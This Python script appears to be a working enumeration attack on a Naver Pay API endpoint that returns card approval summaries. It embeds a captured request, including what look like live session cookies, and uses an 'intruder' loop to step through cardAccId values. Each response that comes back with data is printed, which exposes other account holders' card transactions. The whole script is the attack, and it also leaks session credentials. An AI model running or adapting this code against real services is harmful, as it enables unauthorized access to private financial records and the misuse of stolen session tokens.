#-*- coding: utf-8 -*-

from arang import *

pac = '''GET https://new-m.pay.naver.com/api/vertical/cardApprovalSummaries?cardAccId=$@#2588556#@$&startDate=1920-10-01&endDate=2020-10-22 HTTP/1.1
Host: new-m.pay.naver.com
Accept: application/json, text/plain, */*
Connection: keep-alive
Cookie: NNB=4HO3GRN24CIF6; NID_SES=AAABmA0tX9hFRw+igrTdtDlDptvFTMGanjzxax6QkI4Gh/cgb3ZW6o7vgb4HddWC9bTUJfSg6XaeEF147rFOEfh55HtKhaVl8W9rvEPuMsJUMrf87+HGp5FQaoikULUewsFQHpBHB8T9dPcjCaAuYGpLbxfKTELGBZHfDNLzNmqR20wCjXWzRh8RVlg1m4E7/aClSiYQoPbB/qN6xT9pPzns+Kf9dVF3ZBzJFFkrG2hYnmsPbzs9L3h704FYJhQ1nxRoCHubtXg+1kPIiAnvPRlYs+odgOGfXHtLKf0m9NHWeuky8Ww6xBwwZWs6d+AC4kG4XtA5daMuB9p2hg1vdYvLvbntSHKuskWLlDmNy1LISYt4GUCU5gunSwTaucAkzcLew6OnpcUzhPQbKYa/dGh9MXhoJLTJg5Nrhfa4o7F+Emt7DZvT/yJNF3V2Pg3okDtbsuGtZUqvvmwu+wuydTX8fW9i0uMIBH/nrAe/HRgyRASUGE2prmi2CSMdhtyiLzY6S5O8V+a70otxvOnF3IdJF3ppnzqP75E3QydEIDSTgiVv; m_loc=d7a1c6d7d6798e9b19fc24dbf6370111bc040fac462f017b57e7471526b96de0fecf4960d4639aaa7f7f1ca63ec452685efe3b98178488f812fd9e687b02c65282d4f885b0bfdab0a7057bb0fcbf3441929bc015d7ccf3a593780b066ead25c29da13ef2617237edc55b239120c585df216054b8ef2fc44761341255c967560b; MM_NEW=1; MM_sti=m_main_strw; NFS=2; GDOT=Y; NAPP_DI=920ffd8ab327d4716f9794b027b053e7; DA_DD=2158349C-C00E-4522-BF9E-EB6879EDF5E4; DA_DV=920ffd8ab327d4716f9794b027b053e7; NID_AUT=1NtSP1o2Ymi06zHM8xOI9EX/GJ1Qi2Jx40TrOQPHO+tddn6UoIc7EZfj1iDNFfeN; NID_JKL=dN6Xb8X51GUx9S8y36s3mccn+Od0YW/28yR3JjItpaM=; nid_inf=946096304; MM_NOW_COACH=1
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/605.1 NAVER(inapp; search; 730; 10.27.3; 8)
Accept-Language: ko-kr
Referer: https://new-m.pay.naver.com/
Accept-Encoding: br, gzip, deflate

'''

pp = parsePacket(pac)

print(dir(pp))
print(pp.url)
print(pp.headers)


a = pp.sequentialIntruder(pac, to=2588056, option='lower', find="31", verbose=True)
for i in a.keys():
    if b'result":[]' not in a[i].content:
        print(f'{i} - {a[i].content}')